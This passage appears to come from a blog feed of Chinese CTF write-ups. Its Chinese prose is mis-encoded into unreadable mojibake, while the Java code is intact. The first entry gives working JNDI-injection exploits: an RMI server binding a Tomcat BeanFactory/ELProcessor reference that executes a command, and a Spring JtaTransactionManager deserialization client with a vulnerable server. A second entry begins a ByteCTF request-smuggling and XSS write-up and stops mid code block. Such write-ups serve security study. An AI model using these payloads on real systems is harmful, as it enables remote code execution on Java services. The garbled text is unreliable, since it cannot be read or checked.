RCEçš„æ–¹æ³•ã€‚åœ¨<code>javax.el.ELProcessor</code> ä¸­çš„ eval æ–¹æ³•å°±å¾ˆåˆé€‚</p></blockquote><p>æ¥çœ‹ä¸€ä¸‹BeanFactoryç±»çš„è¿™ä¸ªæ–¹æ³•ã€‚é¦–å…ˆåˆ¤æ–­äº†æ˜¯å¦ç»§æ‰¿äº†<code>ResourceRef</code>ç±»ï¼Œç„¶ååé¢ç”¨åŠ è½½å™¨è½½å…¥äº†classï¼Œæ–¹ä¾¿åé¢çš„å®ä¾‹åŒ–ã€‚è¿™é‡Œçš„ResourceRef æ˜¯è¿™æ ·å®šä¹‰çš„<code>public class ResourceRef extends AbstractRef</code>ï¼Œç»§ç»­å¾€ä¸‹å°±æ˜¯<code>public abstract class AbstractRef extends Reference </code></p><p><img src="https://img-blog.csdnimg.cn/45ce1a7dc7f24593864f0b005f57e51f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åé¢ä»£ç ä¸­<code>get</code>æ–¹æ³•è·å–åˆ°äº†è·å–åˆ°äº†åä¸º<code>forceString</code>çš„RefAddrï¼Œè¿™é‡Œå­˜åœ¨ç€å¯æ§çš„é”®å€¼å¯¹å±æ€§ï¼Œåé¢è°ƒç”¨RefAddrçš„getContentå‡½æ•°ï¼Œ<code>value = (String)ra.getContent();</code>å°±å¯ä»¥è·å¾—forceStringé”®å¯¹åº”çš„å€¼ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“forceStringå¯¹åº”çš„å†…å®¹ä¸­å­˜åœ¨<code>=</code>æ—¶ï¼Œå°†æˆªå–<code>=</code>åé¢çš„å­—ç¬¦ä¸²ä½œä¸ºåç»­è°ƒç”¨çš„å‡½æ•°åã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä»»æ„æŒ‡å®šå½“å‰å¯¹è±¡çš„ç±»å‡½æ•°äº†ã€‚forceé”®å€¼å¯¹ä¸­å°†åŒ…å«<code>=</code>å‰é¢çš„å†…å®¹å’Œç›¸åº”çš„Methodå¯¹è±¡ã€‚ä¾‹å¦‚<code>test=eval</code>,æœ€ç»ˆæˆ‘ä»¬å°†å¾—åˆ°evalçš„Methodå¯¹è±¡</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220120192907355.png" alt="image-20220120192907355"></p><p><img src="https://img-blog.csdnimg.cn/f7bb4723321f41f296a8fc15cf9be7a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†å¾€ä¸‹èµ°ï¼Œä¸­é—´æœ‰ä¸€å¤§é¡¿å¾ªç¯ä»£ç å°±å¿½ç•¥äº†ï¼Œè¿™é‡Œè´´ä¸€ä¸‹å…³é”®ä»£ç ã€‚è¿™é‡Œé€šè¿‡<code>Enumeration e = ref.getAll();</code>è·å–æ‰€æœ‰çš„<code>Refaddr</code>ã€‚ç„¶åç”¨è·å–äº†raè¿™ä¸ªRefAddrå½“å‰é”®å¯¹åº”çš„å€¼ã€‚æœ€åç”¨åå°„è°ƒç”¨äº†è¿™ä¸ªmethodã€‚å…³äºæœ€ç»ˆç”¨æ¥å‘½ä»¤æ‰§è¡Œå¾—å‡½æ•°æ˜¯<code>javax.el.ELProcessor</code>ä¸­å¾—<code>eval</code>å‡½æ•°ï¼Œåœ¨evalå‡½æ•°ä¸­å¯ä»¥æ‰§è¡ŒjavaELè¡¨è¾¾å¼ã€‚è¿™ä¸ªåˆ©ç”¨ç‚¹ä¹Ÿæ˜¯jspshellä¸­ç»å¸¸å‡ºç°å¾—ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Enumeration e = ref.getAll();<br>value = (String)ra.getContent();<br>Object[] valueArray = <span class="hljs-keyword">new</span> Object[<span class="hljs-number">1</span>];<br>Method method = (Method)forced.get(propName);<br><br>.........<br><br><span class="hljs-keyword">if</span> (method != <span class="hljs-keyword">null</span>) &#123;<br>        valueArray[<span class="hljs-number">0</span>] = value;<br>            <span class="hljs-keyword">try</span> &#123;<br>                method.invoke(bean, valueArray);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException | InvocationTargetException | IllegalAccessException var23) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NamingException(<span class="hljs-string">&quot;Forced String setter &quot;</span> + method.getName() + <span class="hljs-string">&quot; threw exception for property &quot;</span> + propName);<br>        &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>åˆ†æä¸‹expã€‚è¿™å…¶ä¸­è¿˜åˆ©ç”¨äº†<code>ScriptEngineManager</code>ç±»</p><p>é€šè¿‡ScriptEngineManagerè¿™ä¸ªç±»å¯ä»¥å®ç°Javaè·ŸJSçš„ç›¸äº’è°ƒç”¨ï¼Œè™½ç„¶Javaè‡ªå·±æ²¡æœ‰evalå‡½æ•°ï¼Œä½†æ˜¯ScriptEngineManageræœ‰evalå‡½æ•°ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥è°ƒç”¨Javaå¯¹è±¡ï¼Œä¹Ÿå°±ç›¸å½“äºé—´æ¥å®ç°äº†Javaçš„evalåŠŸèƒ½ã€‚ä½†æ˜¯å†™å‡ºæ¥çš„ä»£ç å¿…é¡»æ˜¯JSé£æ ¼çš„ï¼Œæ‰€ä»¥å…¶å®åˆå«è¡¨è¾¾å¼å¼•ç”¨ã€‚å®ƒå¯ä»¥å®ç°javaï¼Œjså¾—ç›¸äº’è°ƒç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMIattack;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMI1_8server</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, NamingException </span>&#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        ResourceRef ref = <span class="hljs-keyword">new</span> ResourceRef(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-keyword">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-keyword">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        ReferenceWrapper referenceWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(ref);<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/evilObj&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/9132361c929c4edd8747b997e26bafd9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>serverç«¯</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.Spring;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.*;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">server</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//é«˜ç‰ˆæœ¬</span><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="hljs-keyword">true</span>));<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//æœ¬åœ°ç›‘å¬1234ç«¯å£</span><br>            ServerSocket serverSocket = <span class="hljs-keyword">new</span> ServerSocket(<span class="hljs-number">1234</span>);<br>            System.out.println(<span class="hljs-string">&quot;Server started on port &quot;</span> + serverSocket.getLocalPort());<br>            <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>                Socket socket = serverSocket.accept();<br>                System.out.println(<span class="hljs-string">&quot;Connection received from &quot;</span> + socket.getInetAddress());<br>                ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(socket.getInputStream());<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">//æ‰§è¡Œæ¥æ”¶åˆ°ç±»çš„readObjectæ–¹æ³•ï¼Œè§¦å‘æ¼æ´</span><br>                    Object object = objectInputStream.readObject();<br>                    System.out.println(<span class="hljs-string">&quot;Read object &quot;</span> + object);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;Exception caught while reading object&quot;</span>);<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>clientç«¯</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.Spring;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.BufferedOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> org.springframework.transaction.jta.JtaTransactionManager;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExpClient</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        <span class="hljs-comment">//æœ¬åœ°æ³¨å†Œå¼•ç”¨</span><br>        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Reference ref = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br>        ReferenceWrapper referenceWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(ref);<br>        registry.bind(<span class="hljs-string">&quot;refObj&quot;</span>,referenceWrapper);<br>        send();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">send</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        JtaTransactionManager obj = <span class="hljs-keyword">new</span> JtaTransactionManager();<br>        Socket socket = <span class="hljs-keyword">new</span> Socket(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1234</span>);<br>        System.out.println(<span class="hljs-string">&quot;connect success&quot;</span>);<br>        <span class="hljs-comment">//è®¾ç½®æ¶æ„å¾—è¿œç¨‹è°ƒç”¨ç±»ã€‚</span><br>        obj.setUserTransactionName(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/refObj&quot;</span>);<br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(socket.getOutputStream());<br>        outputStream.writeObject(obj);<br>        outputStream.flush();<br>        outputStream.close();<br>        socket.close();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>æœ€å¼€å§‹è¿›å…¥<code>initUserTransactionAndTransactionManager</code>åˆå§‹åŒ–æ–¹æ³•</p><p><img src="https://img-blog.csdnimg.cn/e4b494885ef0447b8eee58f3a65ed022.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶åå¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨äº†<code>lookupUserTransaction</code>å¯»æ‰¾æˆ‘ä»¬è®¾ç½®å¾—æ¶æ„å€¼ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="https://img-blog.csdnimg.cn/414edb28d96540dba5a6fd5a8457c700.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶åå‘ç°äº†ä¸€ä¸ªå¾ˆç†Ÿæ‚‰å¾—<code>lookup</code>æ¥å¯»æ‰¾è¿œç¨‹è°ƒç”¨å¯¹è±¡ï¼Œå…¶å®å†å¾€åè·Ÿè¿›å°±èƒ½å‘ç°å°±æ˜¯JNDIå¸¸ç”¨å¾—é‚£ä¸ª<code>lookuo</code>æ–¹æ³•</p><p><img src="https://img-blog.csdnimg.cn/cacda3a9bde041e5afffe63988a220f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/99df4319b1dc473798ab92bfd5a684af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/e4baa31cd42b41e0a9996127058ebf80.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™æ¡é“¾çœ‹ä¸‹æ¥è¿˜æ˜¯å¾ˆæ¸…æ™°å¾—ï¼Œæ€»ç»“ä¸€ä¸‹ï¼š</p><p>ç”±äº<code>org.springframework.transaction.jta.JtaTransactionManager</code>ç±»é‡å†™äº†<code>readObject</code>æ–¹æ³•ï¼Œå¹¶ä¸”å…¶ä¸­åœ¨é‡å†™æ–¹æ³•ä¸­è°ƒç”¨äº†<code>initUserTransactionAndTransactionManager</code>æ–¹æ³•ï¼Œæ–¹æ³•å®ç°å¾—è¿‡ç¨‹ä¸­ä½¿ç”¨<code>lookup</code>æ–¹æ³•ç›´æ¥æ¥æŸ¥è¯¢<code>UserTransactionName</code>å˜é‡å¾—å€¼ï¼Œè€Œè¿™ä¸ªå€¼æ˜¯å¯ä»¥é€šè¿‡<code>setter</code>æ¥ç”±æˆ‘ä»¬æ§åˆ¶å¾—ï¼Œä»è€Œè§¦å‘è¿œç¨‹è°ƒç”¨æ¶æ„ç±»å®ç°JNDIæ³¨å…¥ã€‚</p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://www.crisprx.top/archives/389#Spring_Framework_RCE">https://www.crisprx.top/archives/389#Spring_Framework_RCE</a></p><p><a href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x01-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x01-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5</a></p><p><a href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/">https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/131">https://security.tencent.com/index.php/blog/msg/131</a></p><p><a href="https://www.freebuf.com/vuls/253545.html">https://www.freebuf.com/vuls/253545.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bytectf</title>
    <link href="/2022/02/25/Bytectf%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/02/25/Bytectf%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Aginx1"><a href="#Aginx1" class="headerlink" title="Aginx1"></a>Aginx1</h1><p>è€ƒç‚¹æ˜¯è¯·æ±‚èµ°ç§ + ç¼“å­˜æ”»å‡» + XSSã€‚</p><h3 id="å…³äºæºç "><a href="#å…³äºæºç " class="headerlink" title="å…³äºæºç "></a>å…³äºæºç </h3><p>æºç çš„å®ç°åˆ†ä¸ºå››ä¸ªéƒ¨åˆ†ï¼š</p><h4 id="ç”¨vueå®ç°äº†å‰ç«¯çš„å°ä½œæ–‡ç•Œé¢"><a href="#ç”¨vueå®ç°äº†å‰ç«¯çš„å°ä½œæ–‡ç•Œé¢" class="headerlink" title="ç”¨vueå®ç°äº†å‰ç«¯çš„å°ä½œæ–‡ç•Œé¢"></a>ç”¨vueå®ç°äº†å‰ç«¯çš„å°ä½œæ–‡ç•Œé¢</h4><p>æ­¤é¢˜æ˜¯å¹¶æ²¡æœ‰è€ƒå¯Ÿvueæ¡†æ¶ä¸­çš„ç›¸å…³æ¼æ´çš„</p><h4 id="å®ç°äº†botæœºå™¨çƒ­æ¨¡æ‹Ÿè®¿é—®æ–‡ç« "><a href="#å®ç°äº†botæœºå™¨çƒ­æ¨¡æ‹Ÿè®¿é—®æ–‡ç« " class="headerlink" title="å®ç°äº†botæœºå™¨çƒ­æ¨¡æ‹Ÿè®¿é—®æ–‡ç« "></a>å®ç°äº†botæœºå™¨çƒ­æ¨¡æ‹Ÿè®¿é—®æ–‡ç« </h4><p>botè¿™ä¸ªåŠŸèƒ½åœ¨å¸¸è§çš„xssé¢˜ç›®é‡Œé¢éƒ½ä¼šå‡ºç°ï¼Œè¿™é‡Œä¹Ÿæ˜¯å¯ä»¥é€šè¿‡botè¿›è¡Œxssçš„ï¼Œæ•´ä½“çœ‹botçš„åŠŸèƒ½å°±æ˜¯ï¼Œå®ƒåœ¨ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œå¹¶ä¸”ä½ å¯ä»¥ncè¿æ¥ï¼Œå°†ä½ è¦è®¿é—®çš„æ–‡ç« idå‘ç»™botï¼Œå®ƒä¼šç”¨adminè´¦æˆ·å»ç™»å½•æŸ¥çœ‹ã€‚è¿™é‡Œå°±è”æƒ³åˆ°å¦‚æœæˆ‘ä»¬åœ¨è¦è®¿é—®çš„æ–‡ç« ä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œå†è®©botè®¿é—®ä¸å°±å®ç°äº†xssäº†å—ã€‚å†ä»”ç»†çœ‹æºç ä¹Ÿå¯ä»¥å‘ç°ï¼Œbotç™»å½•äº†adminè´¦æˆ·ï¼Œå¹¶ä¸”è¿›è¡Œäº†ä¸€ä¸ªè·³è½¬ï¼Œè¿™é‡Œå¾ˆå®¹æ˜“è”æƒ³åˆ°ç›®å½•ç©¿è¶Šï¼Œç®€å•çš„æ“ä½œä¸€ä¸‹ä¹Ÿå¯ä»¥è¯å®äº†ç¡®å®å¯ä»¥ç›®å½•ç©¿è¶Šã€‚</p><p><img src="https://img-blog.csdnimg.cn/9ff7f3aa3aff4722ba291b8aba3b6236.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="goå®ç°çš„ä¸€ä¸ªa-ginxåå‘ä»£ç†æœåŠ¡"><a href="#goå®ç°çš„ä¸€ä¸ªa-ginxåå‘ä»£ç†æœåŠ¡" class="headerlink" title="goå®ç°çš„ä¸€ä¸ªa-ginxåå‘ä»£ç†æœåŠ¡"></a>goå®ç°çš„ä¸€ä¸ªa-ginxåå‘ä»£ç†æœåŠ¡</h4><p>è¿™é‡Œçš„a-ginxæœåŠ¡ä¸»è¦æ˜¯ç”¨æ¥åˆ¤æ–­è¯·æ±‚çš„æ–‡ä»¶æ˜¯å¦æ˜¯ç¼“å­˜æ–‡ä»¶ï¼Œå½“è¯·æ±‚çš„å†…å®¹æ²¡æœ‰ç¼“å­˜æ—¶è½¬å‘ç»™å¦å¤–ä¸€ä¸ªæœåŠ¡å¤„ç†ï¼Œå¹¶ä¸”å°†æ­£å¸¸è¿”å›çš„å†…å®¹è¿›è¡Œä¸€ä¸ªç¼“å­˜ã€‚</p><p>å…ˆæ˜¯è¿›è¡Œäº†ä¸¤ä¸ªåˆ¤æ–­ï¼Œä¸€æ˜¯åˆ¤æ–­æ˜¯å¦èƒ½è·å–åˆ°é™æ€æ–‡ä»¶ï¼ŒäºŒæ˜¯åˆ¤æ–­æ˜¯å¦æœ‰ç¼“å­˜ï¼Œå¦‚æœéƒ½ä¸æ˜¯æ‰å‘èµ·ä¸€ä¸ªä»£ç†è¯·æ±‚ã€‚</p><p><img src="https://img-blog.csdnimg.cn/d973b22abe9a4a3d87db699b684110a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨å¤„ç†è¿‡ç¨‹çš„æœ€å¼€å§‹ä¼šåˆ›å»ºä¸€ä¸ªå’Œå¤„ç†ä»£ç†è¯·æ±‚çš„æœåŠ¡çš„TCPè¿æ¥ã€‚å¹¶ä¸”ä¼šä¿æŒè¿æ¥ã€‚</p><p><img src="https://img-blog.csdnimg.cn/dd06bb4557584c89aab3d048cfe55f95.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æˆ‘ä»¬å†æ¥çœ‹å®ƒæ˜¯å¦‚ä½•å‘é€è¯·æ±‚çš„ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå°±æ˜¯è¿›è¡Œäº†ä¸€ä¸ªhttp2çš„é™çº§ï¼Œç„¶åç®€å•çš„è¿›è¡Œäº†ä¸€äº›è¯·æ±‚å¤´çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå¹¶ä¸”æ·»åŠ äº†ä¸€ä¸ª<code>X-Sup3r-Re4l-Ip</code>å¤´ï¼Œå€¼å°±æ˜¯æ¥è‡ªç”¨æˆ·çš„ipåœ°å€ã€‚è¿™é‡Œå°±æ¶‰åŠåˆ°è¯·æ±‚èµ°ç§çš„é—®é¢˜äº†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/c5234be652ca48f4b6c638200863e98b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="goå®ç°çš„å¤„ç†a-ginxä»£ç†è½¬å‘çš„è¯·æ±‚çš„æœåŠ¡"><a href="#goå®ç°çš„å¤„ç†a-ginxä»£ç†è½¬å‘çš„è¯·æ±‚çš„æœåŠ¡" class="headerlink" title="goå®ç°çš„å¤„ç†a-ginxä»£ç†è½¬å‘çš„è¯·æ±‚çš„æœåŠ¡"></a>goå®ç°çš„å¤„ç†a-ginxä»£ç†è½¬å‘çš„è¯·æ±‚çš„æœåŠ¡</h4><p>è¿™ä¸ªæœ€ç»ˆçš„å¤„ç†æœåŠ¡å®ç°äº†å‘è¡¨æ–‡ç« ï¼ŒæŸ¥è¯¢æ–‡ç« ï¼Œé¢„è§ˆæ–‡ç« ç­‰ç­‰åŠŸèƒ½ã€‚è¿™é‡Œçš„é¢„è§ˆæ–‡ç« æ˜¯æœ€å¯ç–‘çš„ï¼Œé€šè¿‡goæ¨¡æ¿æ˜¾ç¤ºå†…å®¹ï¼Œå¯èƒ½ä¼šå­˜åœ¨goçš„æ¨¡æ¿æ³¨å…¥ã€‚</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 